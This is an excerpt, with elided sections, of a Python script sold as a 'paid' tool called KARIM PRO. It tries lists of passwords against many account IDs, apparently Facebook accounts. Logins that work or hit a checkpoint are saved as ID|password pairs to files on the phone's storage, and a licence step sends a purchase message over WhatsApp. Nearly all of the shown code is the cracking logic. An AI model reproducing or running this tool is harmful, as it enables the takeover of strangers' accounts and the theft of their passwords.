...
db   dD  .d8b.  d8888b. d888888b .88b  d88. 
88 ,8P' d8' `8b 88  `8D   `88'   88'YbdP`88 
88,8P   88ooo88 88oobY'    88    88  88  88 
88`8b   88~~~88 88`8b      88    88  88  88 
88 `88. 88   88 88 `88.   .88.   88  88  88 
YP   YD YP   YP 88   YD Y888888P YP  YP  YP 
----------------------------------------------
 Author    : KARIM 
 Github    : KARIM-111
 Type type : PAID
 Version   : 0.1
----------------------------------------------
 KARIM PRO VERSION 2.0
 FEEL THE POWER OF KARIM (⁠⌐⁠■⁠-⁠■⁠)
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi KARIM Sir, I Need To Buy Your Paid KARIM PRO Tools Version 2.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python KARIM.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [KARIM-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [KARIM-OK] %s | %s'%(ids,pas))
                                open('/sdcard/KARIM-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [KARIM-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KARIM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [KARIM-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KARIM-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/KARIM-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [KARIM-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/KARIM-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [KARIM-OK] '+uid+' | '+pas+'\033[1;97m')
